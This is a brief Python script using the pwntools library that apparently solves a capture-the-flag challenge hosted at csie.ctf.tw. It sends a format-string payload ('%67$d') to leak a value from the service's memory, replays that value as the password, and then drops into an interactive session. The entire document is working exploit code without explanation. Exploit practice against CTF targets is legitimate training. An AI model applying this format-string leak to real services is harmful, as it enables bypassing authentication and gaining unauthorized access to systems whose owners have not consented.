#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10128)

r.recvuntil(' = ')
r.sendline('%67$d')
passwd = r.recvline()[3:]
r.recvuntil(' = ')
r.sendline(passwd)

r.interactive()
